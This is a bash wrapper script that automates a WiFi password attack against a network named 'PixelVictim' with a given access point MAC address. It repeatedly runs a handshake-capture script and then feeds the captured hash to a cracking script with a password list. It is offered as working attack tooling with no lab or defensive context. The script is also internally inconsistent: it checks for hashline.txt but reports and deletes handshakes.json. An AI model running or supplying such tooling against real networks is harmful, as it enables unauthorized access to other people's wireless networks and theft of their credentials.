#!/bin/bash

# Parameters for capture_handshake.py
INTERFACE="wlan1"
ESSID="PixelVictim"
MAC_AP="74:DA:38:6B:98:DD"

# Parameters for crack_handshake.py
PASSLIST="passlist.txt"

# Loop to ensure capture_handshake.py keeps running until successful
while true; do
    echo "Running capture_handshake.py..."
    sudo python3 capture_handshake.py "$INTERFACE" "$ESSID" "$MAC_AP"

    # Check if the handshakes.json file was created
    if [ -f "hashline.txt" ]; then
        echo "Handshakes captured successfully."

        # Extract the hashline from handshakes.json
        HASHLINE=$(cat hashline.txt)

        # Check if HASHLINE was extracted
        if [ -z "$HASHLINE" ]; then
            echo "Error: No hashline found in handshakes.json"
            echo "Retrying capture..."
            rm handshakes.json
            continue
        fi

        # Run the crack_handshake.py script with the extracted hashline
        echo "Running crack_handshake.py..."
        python3 crack_handshake.py "$HASHLINE" "$PASSLIST"
        break
    else
        echo "Error: handshakes.json not found. Ensure capture_handshake.py was executed correctly."
        echo "Retrying capture..."
        sleep 10  # Sleep for a short time before retrying
    fi
done

